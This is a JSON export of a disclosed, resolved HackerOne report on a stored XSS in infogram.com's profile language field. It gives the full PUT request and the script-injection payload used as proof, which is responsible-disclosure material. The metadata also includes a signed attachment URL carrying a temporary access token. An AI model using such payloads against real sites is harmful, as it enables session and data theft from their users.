{"id":430029,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MzAwMjk=","url":"https://hackerone.com/reports/430029","title":"Stored XSS in infogram.com via language ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-10-28T21:18:50.797Z","submitted_at":"2018-10-28T21:18:50.797Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"theappsec","url":"/theappsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/292/168/92f5398496b7b145261f847108970ba013387c3e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21745,"url":"https://hackerone.com/infogram","handle":"infogram","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Infogram","twitter_handle":"infogram","website":"http://infogram.com","about":"Make Infographics and Charts that People Love"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-06-22T07:54:17.827Z","bug_reporter_agreed_on_going_public_at":"2019-05-23T07:54:15.625Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The stored XSS was found in the language profile parameter.\n\nPOC:\nChange profile settings with following request:\n\n```http\nPUT /api/users/me HTTP/1.1\nHost: infogram.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\ncsrf-token: **your token**\nX-Requested-With: XMLHttpRequest\nContent-Length: 135\nDNT: 1\nConnection: close\nCookie: **your cookies**\n\nfirst_name=name\u0026last_name=name\u0026username=\u0026confirm_password=password\u0026language=\u003e\u003c/script\u003e\u003cimg src=x onerror=alert(document.domain)\u003e;//\n```\nGo to your public profile link.\n\nexample: https://infogram.com/dd_ddt7\n\n## Impact\n\nThis allows an attacker to inject custom Javascript codes that can be used to steal information from infogram's users.","vulnerability_information_html":"\u003cp\u003eThe stored XSS was found in the language profile parameter.\u003c/p\u003e\n\n\u003cp\u003ePOC:\u003cbr\u003e\nChange profile settings with following request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePUT\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/users/me\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003einfogram.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e*/*\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded; charset=UTF-8\u003c/span\u003e\n\u003cspan class=\"na\"\u003ecsrf-token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e**your token**\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e135\u003c/span\u003e\n\u003cspan class=\"na\"\u003eDNT\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e**your cookies**\u003c/span\u003e\n\nfirst_name=name\u0026amp;last_name=name\u0026amp;username=\u0026amp;confirm_password=password\u0026amp;language=\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt;;//\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGo to your public profile link.\u003c/p\u003e\n\n\u003cp\u003eexample: \u003ca title=\"https://infogram.com/dd_ddt7\" href=\"/redirect?url=https%3A%2F%2Finfogram.com%2Fdd_ddt7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://infogram.com/dd_ddt7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis allows an attacker to inject custom Javascript codes that can be used to steal information from infogram\u0026#39;s users.\u003c/p\u003e\n","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":367600,"file_name":"Selection_088.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/367/600/05b02b9c44bb1da9c93aab54cf297910acd92a80/Selection_088.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_088.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_088.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055712Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026X-Amz-Signature=4fc2edb9e9220013cbf4c1d7fd725f837c4056168d2d6d902bd487966b0c546b","file_size":28579,"type":"image/png"}],"allow_singular_disclosure_at":"2019-06-22T07:54:15.686Z","allow_singular_disclosure_after":-48031376.7973643,"singular_disclosure_allowed":true,"vote_count":20,"voters":["sameerphad72","mygf","nu11sec","yinvi777","khizer47","bb00x","tems","sa1tama0","th3r4id","cipherboy","and 10 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":870,"asset_type":"URL","asset_identifier":"infogram.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3548440,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-29T10:16:32.971Z","updated_at":"2018-10-29T10:16:32.971Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3549186,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for the report! It is fixed now.\n\nBest regards,\nKaspars\n","markdown_message":"\u003cp\u003eThanks for the report! It is fixed now.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nKaspars\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-29T13:52:02.693Z","updated_at":"2018-10-29T13:52:02.693Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"theappsec","url":"/theappsec"},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3549570,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fast fix, good job!","markdown_message":"\u003cp\u003eFast fix, good job!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-29T15:06:16.527Z","updated_at":"2018-10-29T15:06:16.527Z","actor":{"username":"theappsec","cleared":false,"url":"/theappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/292/168/92f5398496b7b145261f847108970ba013387c3e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4907626,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-23T07:54:15.653Z","updated_at":"2019-05-23T07:54:15.653Z","first_to_agree":true,"actor":{"username":"theappsec","cleared":false,"url":"/theappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/292/168/92f5398496b7b145261f847108970ba013387c3e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5166956,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-22T07:54:17.842Z","updated_at":"2019-06-22T07:54:17.842Z","actor":{"url":"/infogram","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Infogram"}},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}